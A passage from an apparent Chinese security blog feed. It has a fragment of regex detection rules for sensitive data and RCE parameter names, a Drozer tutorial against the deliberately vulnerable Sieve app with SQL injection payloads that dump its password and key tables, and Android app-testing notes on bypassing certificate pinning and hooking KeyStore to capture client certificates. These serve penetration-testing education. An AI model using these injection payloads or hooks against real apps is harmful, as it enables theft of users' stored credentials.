(^([a-fA-F0-9]&#123;2&#125;(:[a-fA-F0-9]&#123;2&#125;)&#123;5&#125;)|[^a-zA-Z0-9]([a-fA-F0-9]&#123;2&#125;(:[a-fA-F0-9]&#123;2&#125;)&#123;5&#125;))</span><br><span class="line">    scope: response</span><br><span class="line"> </span><br><span class="line"> - color: orange</span><br><span class="line">    engine: nfa</span><br><span class="line">    loaded: false</span><br><span class="line">    name: Chinese Bank Card ID</span><br><span class="line">    regex: [^0-9]([1-9]\d&#123;12,18&#125;)[^0-9]</span><br><span class="line">    scope: response</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">  type: Basic Information</span><br><span class="line">- rule:</span><br><span class="line">  - color: cyan</span><br><span class="line">    engine: dfa</span><br><span class="line">    loaded: true</span><br><span class="line">    name: RCE Paramters</span><br><span class="line">    regex: ((cmd&#x3D;)|(exec&#x3D;)|(command&#x3D;)|(execute&#x3D;)|(ping&#x3D;)|(query&#x3D;)|(jump&#x3D;)|(code&#x3D;)|(reg&#x3D;)|(do&#x3D;)|(func&#x3D;)|(arg&#x3D;)|(option&#x3D;)|</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Dict</tag>
      </tags>
  </entry>
  <entry>
    <title>Android安全测试框架Drozer</title>
    <url>/2019/06/20/Android/Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6Drozer/</url>
    <content><![CDATA[<h2 id="0x00-Drozer-简介"><a href="#0x00-Drozer-简介" class="headerlink" title="0x00 Drozer 简介"></a>0x00 Drozer 简介</h2><p>Drozer是MWR Labs开发的一款Android安全测试框架。是目前最好的Android安全测试工具之一。其官方文档说道:“Drozer允许你一一个普通android应用的身份与其他应用和操作系统交互。”在Web世界已经有了许多安全测试工具了,我们只需要给出一个目标,这些工具就会自动为我们安全测试报告。但Drozer与这样的自动化扫描器不同,Drozer是一种交互式的安全测试工具。使用Drozer进行安全测试,用户在自己的工作站上输入命令,Drozer会将命令发送到Android设备上的代理程序执行。其官方文档说道:“Drozer允许你一一个普通android应用的身份与其他应用和操作系统交互。</p>
<a id="more"></a>

<h2 id="0x01-安装和启动"><a href="#0x01-安装和启动" class="headerlink" title="0x01 安装和启动"></a>0x01 安装和启动</h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><p>第一步：从 <a href="https://labs.f-secure.com/tools/drozer/下载Drozer">https://labs.f-secure.com/tools/drozer/下载Drozer</a> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo python2 -m pip install drozer_xxxx.whl</span><br></pre></td></tr></table></figure>

<p>第二步：在 Android 设备中安装 agent.apk</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb install agent.apk</span><br></pre></td></tr></table></figure>

<h3 id="2-启动"><a href="#2-启动" class="headerlink" title="2.启动"></a>2.启动</h3><p>第一步：在 PC 上使用 adb 进行端口转发，转发到 Drozer使用的端口 31415</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb forward tcp:31415 tcp:31415</span><br></pre></td></tr></table></figure>

<p>第二步：在 Android 设备上开启 Drozer Agent</p>
<p>选择 embedded server-enable</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200913023535118.png" alt="image-20200913023535118"></p>
<p>第三步：在 PC 上开启 Drozer console</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drozer console connect</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/bbbbbb-20200913023554336.jpg" alt="bbbbbb-20200913023554336"></p>
<p>第四步 list命令验证安装（列出所有功能模块）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.activity.info           Gets information about exported activities.         </span><br><span class="line">app.activity.start          Start an Activity                                   </span><br><span class="line">app.broadcast.info          Get information about broadcast receivers           </span><br><span class="line">app.broadcast.send          Send broadcast using an intent                      </span><br><span class="line">app.broadcast.sniff         Register a broadcast receiver that can sniff        </span><br><span class="line">                            particular intents                                  </span><br><span class="line">app.package.attacksurface   Get attack surface of package                       </span><br><span class="line">app.package.backup          Lists packages that use the backup API (returns true</span><br><span class="line">                            on FLAG_ALLOW_BACKUP)                               </span><br><span class="line">app.package.debuggable      Find debuggable packages                            </span><br><span class="line">app.package.info            Get information about installed packages            </span><br><span class="line">app.package.launchintent    Get launch intent of package                        </span><br><span class="line">app.package.list            List Packages                                       </span><br><span class="line">app.package.manifest        Get AndroidManifest.xml of package                  </span><br><span class="line">app.package.native          Find Native libraries embedded in the application.  </span><br><span class="line">app.package.shareduid       Look for packages with shared UIDs                  </span><br><span class="line">app.provider.columns        List columns in content provider                    </span><br><span class="line">app.provider.delete         Delete from a content provider                      </span><br><span class="line">app.provider.download       Download a file from a content provider that        </span><br><span class="line">                            supports files                                      </span><br><span class="line">app.provider.finduri        Find referenced content URIs in a package           </span><br><span class="line">app.provider.info           Get information about exported content providers    </span><br><span class="line">app.provider.insert         Insert into a Content Provider                      </span><br><span class="line">app.provider.query          Query a content provider                            </span><br><span class="line">app.provider.read           Read from a content provider that supports files    </span><br><span class="line">app.provider.update         Update a record in a content provider               </span><br><span class="line">app.service.info            Get information about exported services             </span><br><span class="line">app.service.send            Send a Message to a service, and display the reply  </span><br><span class="line">app.service.start           Start Service                                       </span><br><span class="line">app.service.stop            Stop Service                                        </span><br><span class="line">auxiliary.webcontentresolver</span><br><span class="line">                            Start a web service interface to content providers. </span><br><span class="line">exploit.jdwp.check          Open @jdwp-control and see which apps connect       </span><br><span class="line">exploit.pilfer.general.apnprovider</span><br><span class="line">                            Reads APN content provider                          </span><br><span class="line">exploit.pilfer.general.settingsprovider</span><br><span class="line">                            Reads Settings content provider                     </span><br><span class="line">information.datetime        Print Date&#x2F;Time                                     </span><br><span class="line">information.deviceinfo      Get verbose device information                      </span><br><span class="line">information.permissions     Get a list of all permissions used by packages on   </span><br><span class="line">                            the device                                          </span><br><span class="line">scanner.activity.browsable  Get all BROWSABLE activities that can be invoked    </span><br><span class="line">                            from the web browser                                </span><br><span class="line">scanner.misc.native         Find native components included in packages         </span><br><span class="line">scanner.misc.readablefiles  Find world-readable files in the given folder       </span><br><span class="line">scanner.misc.secretcodes    Search for secret codes that can be used from the   </span><br><span class="line">                            dialer                                              </span><br><span class="line">scanner.misc.sflagbinaries  Find suid&#x2F;sgid binaries in the given folder (default</span><br><span class="line">                            is &#x2F;system).                                        </span><br><span class="line">scanner.misc.writablefiles  Find world-writable files in the given folder       </span><br><span class="line">scanner.provider.finduris   Search for content providers that can be queried    </span><br><span class="line">                            from our context.                                   </span><br><span class="line">scanner.provider.injection  Test content providers for SQL injection            </span><br><span class="line">                            vulnerabilities.                                    </span><br><span class="line">scanner.provider.sqltables  Find tables accessible through SQL injection        </span><br><span class="line">                            vulnerabilities.                                    </span><br><span class="line">scanner.provider.traversal  Test content providers for basic directory traversal</span><br><span class="line">                            vulnerabilities.                                    </span><br><span class="line">shell.exec                  Execute a single Linux command.                     </span><br><span class="line">shell.send                  Send an ASH shell to a remote listener.             </span><br><span class="line">shell.start                 Enter into an interactive Linux shell.              </span><br><span class="line">tools.file.download         Download a File                                     </span><br><span class="line">tools.file.md5sum           Get md5 Checksum of file                            </span><br><span class="line">tools.file.size             Get size of file                                    </span><br><span class="line">tools.file.upload           Upload a File                                       </span><br><span class="line">tools.setup.busybox         Install Busybox.                                    </span><br><span class="line">tools.setup.minimalsu       Prepare &#39;minimal-su&#39; binary installation on the     </span><br><span class="line">                            device.</span><br></pre></td></tr></table></figure>



<h2 id="0x03-测试步骤"><a href="#0x03-测试步骤" class="headerlink" title="0x03 测试步骤"></a>0x03 测试步骤</h2><h3 id="1-获取包名"><a href="#1-获取包名" class="headerlink" title="1.获取包名"></a>1.获取包名</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.package.list -f sieve</span><br><span class="line">com.mwr.example.sieve (Sieve)</span><br></pre></td></tr></table></figure>



<h3 id="2-获取应用的基本信息"><a href="#2-获取应用的基本信息" class="headerlink" title="2.获取应用的基本信息"></a>2.获取应用的基本信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.package.info -a com.mwr.example.sieve</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  Application Label: Sieve</span><br><span class="line">  Process Name: com.mwr.example.sieve</span><br><span class="line">  Version: 1.0</span><br><span class="line">  Data Directory: &#x2F;data&#x2F;user&#x2F;0&#x2F;com.mwr.example.sieve</span><br><span class="line">  APK Path: &#x2F;data&#x2F;app&#x2F;com.mwr.example.sieve-1&#x2F;base.apk</span><br><span class="line">  UID: 10065</span><br><span class="line">  GID: [3003]</span><br><span class="line">  Shared Libraries: null</span><br><span class="line">  Shared User ID: null</span><br><span class="line">  Uses Permissions:</span><br><span class="line">  - android.permission.READ_EXTERNAL_STORAGE</span><br><span class="line">  - android.permission.WRITE_EXTERNAL_STORAGE</span><br><span class="line">  - android.permission.INTERNET</span><br><span class="line">  Defines Permissions:</span><br><span class="line">  - com.mwr.example.sieve.READ_KEYS</span><br><span class="line">  - com.mwr.example.sieve.WRITE_KEYS</span><br></pre></td></tr></table></figure>



<h3 id="3-确定攻击面"><a href="#3-确定攻击面" class="headerlink" title="3.确定攻击面"></a>3.确定攻击面</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.package.attacksurface com.mwr.example.sieve</span><br><span class="line">Attack Surface:</span><br><span class="line">  3 activities exported</span><br><span class="line">  0 broadcast receivers exported</span><br><span class="line">  2 content providers exported</span><br><span class="line">  2 services exported</span><br><span class="line">    is debuggable</span><br></pre></td></tr></table></figure>



<h3 id="4-Activity"><a href="#4-Activity" class="headerlink" title="4.Activity"></a>4.Activity</h3><h4 id="（-1-）获取-activity-信息"><a href="#（-1-）获取-activity-信息" class="headerlink" title="（ 1 ）获取 activity 信息"></a>（ 1 ）获取 activity 信息</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dz&gt; run app.activity.info -a com.mwr.example.sieve</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  com.mwr.example.sieve.FileSelectActivity</span><br><span class="line">    Permission: null</span><br><span class="line">  com.mwr.example.sieve.MainLoginActivity</span><br><span class="line">    Permission: null</span><br><span class="line">  com.mwr.example.sieve.PWList</span><br><span class="line">    Permission: null</span><br></pre></td></tr></table></figure>



<h4 id="（-2-）启动-activity"><a href="#（-2-）启动-activity" class="headerlink" title="（ 2 ）启动 activity"></a>（ 2 ）启动 activity</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList</span><br><span class="line">help app.activity.start usage: run app.activity.start [-h] [--action ACTION] [--category CATEGORY] [--component PACKAGE COMPONENT] [--data-uri DATA_URI] [--extra TYPE KEY VALUE] [--flags FLAGS [FLAGS ...]] [--mimetype MIMETYPE]</span><br></pre></td></tr></table></figure>



<h3 id="5-Content-Provider"><a href="#5-Content-Provider" class="headerlink" title="5.Content Provider"></a>5.Content Provider</h3><h4 id="（-1-）获取-Content-Provider-信息"><a href="#（-1-）获取-Content-Provider-信息" class="headerlink" title="（ 1 ）获取 Content Provider 信息"></a>（ 1 ）获取 Content Provider 信息</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.provider.info -a com.mwr.example.sieve</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  Authority: com.mwr.example.sieve.DBContentProvider</span><br><span class="line">    Read Permission: null</span><br><span class="line">    Write Permission: null</span><br><span class="line">    Content Provider: com.mwr.example.sieve.DBContentProvider</span><br><span class="line">    Multiprocess Allowed: True</span><br><span class="line">    Grant Uri Permissions: False</span><br><span class="line">    Path Permissions:</span><br><span class="line">      Path: &#x2F;Keys</span><br><span class="line">        Type: PATTERN_LITERAL</span><br><span class="line">        Read Permission: com.mwr.example.sieve.READ_KEYS</span><br><span class="line">        Write Permission: com.mwr.example.sieve.WRITE_KEYS</span><br><span class="line">  Authority: com.mwr.example.sieve.FileBackupProvider</span><br><span class="line">    Read Permission: null</span><br><span class="line">    Write Permission: null</span><br><span class="line">    Content Provider: com.mwr.example.sieve.FileBackupProvider</span><br><span class="line">    Multiprocess Allowed: True</span><br><span class="line">    Grant Uri Permissions: False</span><br></pre></td></tr></table></figure>



<h4 id="（2）Content-Providers-（数据泄露）"><a href="#（2）Content-Providers-（数据泄露）" class="headerlink" title="（2）Content Providers （数据泄露）"></a>（2）Content Providers （数据泄露）</h4><p><strong>先获取所有可以访问的 Uri ：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run scanner.provider.finduris -a com.mwr.example.sieve</span><br><span class="line">Scanning com.mwr.example.sieve...</span><br><span class="line">Unable to Query  content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;</span><br><span class="line">Unable to Query  content:&#x2F;&#x2F;com.mwr.example.sieve.FileBackupProvider&#x2F;</span><br><span class="line">Unable to Query  content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider</span><br><span class="line">Able to Query    content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F;</span><br><span class="line">Able to Query    content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Keys&#x2F;</span><br><span class="line">Unable to Query  content:&#x2F;&#x2F;com.mwr.example.sieve.FileBackupProvider</span><br><span class="line">Able to Query    content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords</span><br><span class="line">Unable to Query  content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Keys</span><br><span class="line"></span><br><span class="line">Accessible content URIs:</span><br><span class="line">  content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Keys&#x2F;</span><br><span class="line">  content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords</span><br><span class="line">  content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F;</span><br></pre></td></tr></table></figure>

<p><strong>获取各个 Uri 的数据：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; --vertical</span><br></pre></td></tr></table></figure>

<p><strong>查询到数据说明存在漏洞</strong></p>
<h4 id="（3）Content-Providers-（-SQL-注入）"><a href="#（3）Content-Providers-（-SQL-注入）" class="headerlink" title="（3）Content Providers （ SQL 注入）"></a>（3）Content Providers （ SQL 注入）</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; --projection &quot;* FROM SQLITE_MASTER WHERE type&#x3D;&#39;table&#39;;--&quot;</span><br><span class="line">| type  | name             | tbl_name         | rootpage | sql                                                                                              |</span><br><span class="line">| table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                                      |</span><br><span class="line">| table | Passwords        | Passwords        | 4        | CREATE TABLE Passwords (_id INTEGER PRIMARY KEY,service TEXT,username TEXT,password BLOB,email ) |</span><br><span class="line">| table | Key              | Key              | 5        | CREATE TABLE Key (Password TEXT PRIMARY KEY,pin TEXT )                                           |</span><br></pre></td></tr></table></figure>

<p><strong>报错则说明存在 SQL 注入。</strong></p>
<p><strong>列出所有表：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; --projection &quot;* FROM SQLITE_MASTER WHERE type&#x3D;&#39;table&#39;;--&quot;</span><br></pre></td></tr></table></figure>

<p><strong>获取某个表（如 Key ）中的数据：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.provider.query content:&#x2F;&#x2F;com.mwr.example.sieve.DBContentProvider&#x2F;Passwords&#x2F; --projection &quot;* FROM Key;--&quot;</span><br><span class="line">| Password | pin |</span><br></pre></td></tr></table></figure>



<h4 id="（-4-）同时检测-SQL-注入和目录遍历"><a href="#（-4-）同时检测-SQL-注入和目录遍历" class="headerlink" title="（ 4 ）同时检测 SQL 注入和目录遍历"></a>（ 4 ）同时检测 SQL 注入和目录遍历</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run scanner.provider.injection -a com.mwr.example.sieve </span><br><span class="line">run scanner.provider.traversal -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure>



<h3 id="6-Service"><a href="#6-Service" class="headerlink" title="6.Service"></a>6.Service</h3><h4 id="（1）获取-service-详情"><a href="#（1）获取-service-详情" class="headerlink" title="（1）获取 service 详情"></a>（1）获取 service 详情</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run app.service.info -a com.mwr.example.sieve</span><br><span class="line">Package: com.mwr.example.sieve</span><br><span class="line">  com.mwr.example.sieve.AuthService</span><br><span class="line">    Permission: null</span><br><span class="line">  com.mwr.example.sieve.CryptoService</span><br><span class="line">    Permission: null</span><br></pre></td></tr></table></figure>



<h4 id="7-其它模块"><a href="#7-其它模块" class="headerlink" title="7. 其它模块"></a>7. 其它模块</h4><p><strong>shell.start</strong> 在设备上开启一个交互shell</p>
<p><strong>tools.file.upload / tools.file.download</strong> 上传/下载文件到设备 <strong>tools.setup.busybox / tools.setup.minimalsu</strong> 安装可用的二进制文件</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Drozer</tag>
      </tags>
  </entry>
  <entry>
    <title>APP测试常见问题总结</title>
    <url>/2021/12/06/Android/APP%E6%B5%8B%E8%AF%95%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>平常在进行APP测试的时候发现存在了很多问题，现在总结记录一下对应的知识，都在这遍文章下记录更新，老规矩先放一张图</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211206111758936.png" alt="image-20211206111758936"></p>
<a id="more"></a>

<h1 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h1><h2 id="校验服务端HTTPS证书"><a href="#校验服务端HTTPS证书" class="headerlink" title="校验服务端HTTPS证书"></a>校验服务端HTTPS证书</h2><h3 id="导入Burp证书"><a href="#导入Burp证书" class="headerlink" title="导入Burp证书"></a>导入Burp证书</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211206111913609.png" alt="image-20211206111913609"></p>
<p>导出之后使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb push xxx.cer sdard</span><br></pre></td></tr></table></figure>

<p>然后在手机设置中找到安全，选择从SD卡安装证书</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211206112049040.png" alt="image-20211206112049040" style="zoom: 33%;">

<p>也可以开启代理，手机访问 ip:port 手动下载</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211206112158670.png" alt="image-20211206112158670" style="zoom:50%;">

<h2 id="HTTPS证书绑定"><a href="#HTTPS证书绑定" class="headerlink" title="HTTPS证书绑定"></a>HTTPS证书绑定</h2><p>只认定特定的HTTPS证书，其他证书全部拒绝连接</p>
<h3 id="ROOT设备安装Xposed后安装JustTurstMe"><a href="#ROOT设备安装Xposed后安装JustTurstMe" class="headerlink" title="ROOT设备安装Xposed后安装JustTurstMe"></a>ROOT设备安装Xposed后安装JustTurstMe</h3><p><strong>网上文章比较多可以自己搜索</strong></p>
<p>eg:<a href="https://zhuanlan.zhihu.com/p/36538699">https://zhuanlan.zhihu.com/p/36538699</a></p>
<h3 id="非ROOT设备使用VirtualXposed安装JustTrustMe"><a href="#非ROOT设备使用VirtualXposed安装JustTrustMe" class="headerlink" title="非ROOT设备使用VirtualXposed安装JustTrustMe"></a>非ROOT设备使用VirtualXposed安装JustTrustMe</h3><p>网上文章比较多可以自己搜索</p>
<p>eg：</p>
<p>VirtualXposed ：<a href="https://nsapps.cn/index.php/archives/23/">https://nsapps.cn/index.php/archives/23/</a></p>
<p>太极：<a href="https://bbs.pediy.com/thread-258036.htm">https://bbs.pediy.com/thread-258036.htm</a></p>
<h2 id="HTTPS双向证书绑定"><a href="#HTTPS双向证书绑定" class="headerlink" title="HTTPS双向证书绑定"></a>HTTPS双向证书绑定</h2><p>HOOK对应的证书加载函数，导入burp进行抓包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">KeyStore.load.overload(&#39;java.security.KeyStore$LoadStoreParameter&#39;).implementation &#x3D; function (arg0) </span><br><span class="line">KeyStore.load.overload(&#39;java.io.InputStream&#39;, &#39;[C&#39;).implementation &#x3D; function (arg0, arg1) </span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211220165122008.png" alt="image-20211220165122008"></p>
<p>可以看到成功hook到证书和密码，保存并导入<code>User options-TLS-Client TLS Certificates</code>即可</p>
<h2 id="检测代理"><a href="#检测代理" class="headerlink" title="检测代理"></a>检测代理</h2><p>很多APP中会设置如下检测：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String property &#x3D; System.getProperty(&quot;https.proxyHost&quot;);</span><br><span class="line">String property &#x3D; System.getProperty(&quot;https.proxyPort&quot;);</span><br><span class="line">if(!TextUtils.isEmpty(property))&#123;</span><br><span class="line">	return new Proxy(Proxy,Type.HTTP, new InetSockerAddress(Property, Integer.parseInt(property2)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="安装ProxyDroid"><a href="#安装ProxyDroid" class="headerlink" title="安装ProxyDroid"></a>安装ProxyDroid</h3><p>下载地址：<a href="https://proxydroid.cn.uptodown.com/android">https://proxydroid.cn.uptodown.com/android</a></p>
<p>打开之后授予root权限</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211206114924471.png" alt="image-20211206114924471"></p>
<p>1). 对ProxyDroid进⾏配置（基本配置） </p>
<p>Auto Setting不勾选，我们⼿动进⾏配置。 </p>
<p>Host：输⼊代理服务器IP。 </p>
<p>Port：输⼊代理服务器端⼝。 </p>
<p>Proxy Type选择代理服务器提供服务类型：我们这⾥选择HTTP。 </p>
<p>Auto Connect为当2G/3G/WIFI⽹络开启时，⾃动开启代理服务。不勾选，我们⼿动启动，以获取最⼤灵活性。 </p>
<p>Bypass Addresses：相当于⿊名单列表，选择排除代理的IP范围，有需要的可以⾃⼰⼿动设置。 </p>
<p>2). 认证信息配置： </p>
<p>Enable Authentication：如果代理服务器需要账户、密码认证，勾选。 </p>
<p>User：认证账户名。 </p>
<p>Password：认证密码。 </p>
<p>NTLM Authentication：NTLM/ NTLM2，Windows早期的⼀种认证⽅式，不⽤勾选。 </p>
<p>3). 特征设置： </p>
<p>Global Proxy：⼀定要勾选，即为全局代理，代理所有App </p>
<p>Individual Proxy：单独代理所选App，勾选了第⼀条的不⽤管。 </p>
<p>Bypass Mode：勾选了代表第⼆条中所选App不代理，勾选了第⼀条的不⽤管。 </p>
<p>DNS Proxy：开启DNS代理。 </p>
<p>4). 通知设置： </p>
<p>Ringtone：选择通知铃声。 </p>
<p>Vibrate： </p>
<p>5). 都设置完成后，开启Proxy Switch即可。注意：如果使⽤ProxyDroid，⽆需在系统wifi处设置代理。</p>
<p>同理的</p>
<h3 id="使用Burp透明代理模式"><a href="#使用Burp透明代理模式" class="headerlink" title="使用Burp透明代理模式"></a>使用Burp透明代理模式</h3><p>我们使用Burp的透明代理模式，在BurpSuite中监听80和443这两个端口，并且将其设置为透明代理模式：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211206151723408.png" alt="image-20211206151723408"></p>
<p>手机连接电脑，以下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">iptables -t nat -A OUTPUT -d 0.0.0.0&#x2F;0 -p tcp -j DNAT --to 172.20.10.3</span><br></pre></td></tr></table></figure>

<h3 id="逆向检测代理位置，Patch或者HOOK等"><a href="#逆向检测代理位置，Patch或者HOOK等" class="headerlink" title="逆向检测代理位置，Patch或者HOOK等"></a>逆向检测代理位置，Patch或者HOOK等</h3><h2 id="流量不通过代理"><a href="#流量不通过代理" class="headerlink" title="流量不通过代理"></a>流量不通过代理</h2><h3 id="使用ProxyDroid或者Postern"><a href="#使用ProxyDroid或者Postern" class="headerlink" title="使用ProxyDroid或者Postern"></a>使用ProxyDroid或者Postern</h3><p>ProxyDroid上文已经介绍Postern配置如下</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211220170123027.png" alt="image-20211220170123027"></p>
<h3 id="使用Proxifier进行绕过"><a href="#使用Proxifier进行绕过" class="headerlink" title="使用Proxifier进行绕过"></a>使用Proxifier进行绕过</h3><p>此方法适用于被分析应用程序正常运行于模拟器中，整体思路如下：</p>
<p><code>安卓模拟器 网络进程 --Proxifier代理 --Burpsuite</code></p>
<p>在Proxifier中添加proxy</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211220182951560.png" alt="image-20211220182951560" style="zoom:50%;">

<p>对于Mac下的MuMu的配置如下：</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211220183120353.png" alt="image-20211220183120353" style="zoom:50%;">

<p>对于Mac下的夜神配置如下：</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211220191735429.png" alt="image-20211220191735429" style="zoom:50%;">

<p>其他模拟器思路类似</p>
<h2 id="使用传输层协议"><a href="#使用传输层协议" class="headerlink" title="使用传输层协议"></a>使用传输层协议</h2><p>使用TCP或UDP</p>
<p>解决方法：WireShark </p>
<p>1). tcpdump 是⼀个运⾏在 Linux 平台的可执⾏ ELF ⽂件 <a href="https://www.androidtcpdump.com/android-tcpdump/downloads">https://www.androidtcpdump.com/android-tcpdump/downloads</a> 下载⼆进制⽂件 </p>
<p>2). 由于依赖adb，⾸先在 macOS 安装adb，命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ brew cask install android-platform-tools</span><br></pre></td></tr></table></figure>

<p>3).拥有设备root权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ adb push tcpdump &#x2F;data&#x2F;local&#x2F;tmp</span><br><span class="line"># adb shell</span><br><span class="line"># su</span><br><span class="line"># chmod 755 tcpdump</span><br><span class="line"># .&#x2F;tcpdump -i any -p -s 0 -w &#x2F;sdcard&#x2F;capture.pcap</span><br><span class="line">$ adb pull &#x2F;sdcard&#x2F;capture.pcap &#x2F;pcpath</span><br><span class="line">使⽤Wireshark打开 pcap⽂件</span><br><span class="line">$ wireshark &#x2F;pcpath&#x2F;capture.pcap</span><br></pre></td></tr></table></figure>

<h2 id="使用VPN"><a href="#使用VPN" class="headerlink" title="使用VPN"></a>使用VPN</h2><p>需要具体分析</p>
<h1 id="通信数据加解密-签名"><a href="#通信数据加解密-签名" class="headerlink" title="通信数据加解密/签名"></a>通信数据加解密/签名</h1><h2 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h2><h3 id="Httpdecrypt"><a href="#Httpdecrypt" class="headerlink" title="Httpdecrypt"></a>Httpdecrypt</h3><p><a href="https://www.ol4three.com/2020/12/29/Android/%E4%BD%BF%E7%94%A8Httpdecrypt%E8%BF%9B%E8%A1%8CHOOK/">httpdecrypt</a></p>
<h2 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h2><h3 id="Inspeckage"><a href="#Inspeckage" class="headerlink" title="Inspeckage"></a>Inspeckage</h3><p>在看源码等待更新</p>
<h2 id="Hook-HTTP-HTTPS"><a href="#Hook-HTTP-HTTPS" class="headerlink" title="Hook HTTP/HTTPS"></a>Hook HTTP/HTTPS</h2><h3 id="使用系统中SSL库"><a href="#使用系统中SSL库" class="headerlink" title="使用系统中SSL库"></a>使用系统中SSL库</h3><h4 id="xposed"><a href="#xposed" class="headerlink" title="xposed"></a>xposed</h4><h5 id="java"><a href="#java" class="headerlink" title="java"></a>java</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.androidVersion &gt; 8</span><br><span class="line">	ConscryptFileDescriptorSocket</span><br><span class="line">		解释：</span><br><span class="line">			基于OpenSSLSocketlmpl的实现</span><br><span class="line">		路径：</span><br><span class="line">			http:&#x2F;&#x2F;aosp.opersys.com&#x2F;xref&#x2F;android-10.0.0_r47&#x2F;xref&#x2F;external&#x2F;conscrypt&#x2F;repackaged&#x2F;common&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;android&#x2F;org&#x2F;conscrypt&#x2F;ConscryptFileDescriptorSocket.java#123</span><br><span class="line">		理解：</span><br><span class="line">			android中openssl的实现，存在数据加解密的读写接口</span><br><span class="line">		com.android.org.conscrypt.ConscryptFileDescriptorScoket$SSLOutputStream.write(&#39;[B&#39;,&#39;int&#39;,&#39;int&#39;)</span><br><span class="line">		com.android.org.conscrypt.ConscryptFileDescriptorScoket$SSLIntputStream.read(&#39;[B&#39;,&#39;int&#39;,&#39;int&#39;)</span><br></pre></td></tr></table></figure>

<p>​            </p>
<pre><code>java.androidVersion &lt;= 8
    OpenSSLSocketlmpl
        解释：
            OpenSSL实现
        路径：
            http://aosp.opersys.com/xref/android-8.0.0_r51/xref/external/conscrypt/common/src/main/java/org/conscrypt/OpenSSLSocketImpl.java
        理解：
            android中openssl的实现，存在数据加解密的读写接口

